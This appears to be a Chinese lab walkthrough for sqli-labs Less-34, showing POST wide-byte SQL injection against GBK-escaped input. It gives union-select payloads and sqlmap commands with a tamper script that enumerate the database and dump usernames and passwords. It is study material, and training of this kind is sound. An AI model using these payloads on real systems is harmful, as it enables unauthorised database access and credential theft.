---
title: less34
url: https://www.yuque.com/u29002979/ep2zrx/ql1lqmqlbybenghx
---

```bash
$uname = addslashes($uname1);
$passwd= addslashes($passwd1);

mysql_query("SET NAMES gbk");
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

post型宽字节注入 ，单引号'闭合

`admin' or 1=1-++`

> Hint: The Username you input is escaped as : admin' or 1=1-++
> Hint: The Password you input is escaped as :

在登录框尝试字符登录发现有转义&#x20;
&#x20;因为是post提交不能使用url编码，
但是可以**使用十六进制编码绕过**，但是需要使用三个字节，
最好的 办法是是**使用汉字**(一些汉字是三个字节的就可以将后面的\消耗) <a name="rJWqQ"></a>

# post型宽字节注入

<a name="oaebC"></a>

## 爆破数据库名称

`uname=汉' union select 1,database()--+` <a name="ABEKW"></a>

## 爆破数据库表名称

`**uname=汉' union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()--+` <a name="ihxEF"></a>

## 爆破字段名称

爆破字段的时候**需要将数据表的名字**进行十六进制编码，防止转义 &#x20;
users的16进制是0x7573657273

`**uname=汉'** union select 1,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+` <a name="K0Bi6"></a>

## 爆破字段内容

`**uname=汉'** union select 1,(select group_concat(username,0x7e,password) from users)--+`

<a name="eRAU0"></a>

# sqlmap

> **--tamper="unmagicquotes.py"宽字节注入**

<a name="Eou5c"></a>

## 注入点检查

`sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&uname=admin" --batch --tamper="unmagicquotes.py"` <a name="FwuSB"></a>

## 爆破数据库名称

`sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&uname=admin" --batch --tamper="unmagicquotes.py"  --current-db` <a name="cWP4j"></a>

## 爆破数据表名称

`sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&uname=admin" --batch --tamper="unmagicquotes.py"  -D "security" --tables` <a name="HBofh"></a>

## 爆破字段名称

`sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&uname=admin" --batch --tamper="unmagicquotes.py" -D "security" -T "users" --columns` <a name="YOLQ5"></a>

## 脱库

`sqlmap -u http://192.168.31.193/Less-34/ --data="passwd=admin&uname=admin" --batch --tamper="unmagicquotes.py" -D "security" -T "users" --dump`
